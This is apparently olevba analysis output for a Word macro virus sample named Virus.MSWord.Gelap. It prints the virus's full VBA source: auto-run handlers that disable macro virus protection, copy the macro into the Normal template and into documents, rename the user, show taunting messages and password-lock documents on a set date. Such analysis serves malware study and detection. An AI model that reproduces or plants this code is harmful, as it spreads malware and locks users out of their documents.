olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Gelap
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Gelap - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AuAhGelap.bas 
in file: ./Virus.MSWord.Gelap - OLE stream: 'Macros/VBA/AuAhGelap'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Function SwapMouseButton Lib "user32" (ByVal bSwap As Long) As Long

Sub AutoOpen()
On Error GoTo kagabisa:
If Not Application.UserName = "Sembako" Then
With Assistant.NewBalloon
    .Icon = msoIconNone
    .Text = "Hello " & Application.UserName & ".              Sorry, but your Microsoft Word doesn't belong to you any more. Now it is mine!!"
    .Animation = msoAnimationGreeting
    .Show
End With
End If
Au
Ah
Gelap
kagabisa:
End Sub

Sub AutoClose()
Attribute AutoClose.VB_ProcData.VB_Invoke_Func = "Normal.AuAhGelap.AutoClose"
On Error GoTo kagabisa:
If ActiveDocument.Saved = False Then ActiveDocument.Save
If Not Application.UserName = "Sembako" Then
With Assistant.NewBalloon
    .Icon = msoIconNone
    .Text = "Hello " & Application.UserName & ".                    Sorry, but your Microsoft Word doesn't belong to you any more. Now it belongs to me ""The Sembako""!!"
    .Animation = msoAnimationGreeting
    .Show
End With
End If
Au
Ah
Gelap
Rem SwapMouseButton &H4
kagabisa:
End Sub
Sub Au()
If (Time >= #8:00:00 AM#) And (Time <= #9:00:00 AM#) Then MsgBox "Selamat pagi cewek-cewek yang cakep-cakep .", vbOKOnly, "Selamat pagi"
If (Time >= #12:00:00 PM#) And (Time <= #2:00:00 PM#) Then MsgBox "Hallo cewek-cewek, udah pada makan siang belum ? Sekarang udah jam " & Time & " loh.           Salam sayang buat kamu semua dari my creator.", vbOKOnly, "Selamat siang ."
If Time > #5:00:00 PM# Then MsgBox "Hallo cewek-cewek, kok belum pulang sih? Sekarang udah jam " & Time & " loh. Eh, ada salam dari my creator.", vbOKOnly, "Selamat sore. "
If Day(Now) = 18 And Month(Now) = 4 Then
    Selection.Font.Size = 24
    Selection.Font.Animation = wdAnimationSparkleText
    Selection.TypeText ("Happy birthday to my Creator! ")
    ActiveDocument.Password = "!@#$%BoMoH!@#$%"
End If
End Sub
Sub ToolsMacro()
MsgBox "Eit ! Kamu enggak boleh ngeliat Macro !"
End Sub
Sub Ah()
On Error GoTo rusak:
Options.VirusProtection = False
Application.ScreenUpdating = False
Application.DisplayAlerts = wdAlertsNone
Options.VirusProtection = False
Application.UserName = "Sembako"
Application.UserInitials = "SBK"
DocumentInstalled = False
Options.EnableSound = False
Set ActiveDoc = ActiveDocument
Set GlobalDoc = NormalTemplate
If NormalInstalled = False Then
    Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="AuAhGelap", Object:=wdOrganizerObjectProjectItems
    ActiveDocument.SaveAs FileName:=ActiveDocument.Name, FileFormat:=wdFormatTemplate
    ActiveDocument.Saved = False
End If
rusak:
End Sub
Sub Gelap()
On Error GoTo rusak:
Application.ScreenUpdating = False
Application.DisplayAlerts = wdAlertsNone
Options.VirusProtection = False
Set ActiveDoc = ActiveDocument
Set GlobalDoc = NormalTemplate
GlobalInstalled = False
If GlobalInstalled = False Then
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="AuAhGelap", Object:=wdOrganizerObjectProjectItems
    Options.SaveNormalPrompt = False
    ActiveDocument.Saved = False
End If
rusak:
End Sub

Sub ViewVBCode()
:
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

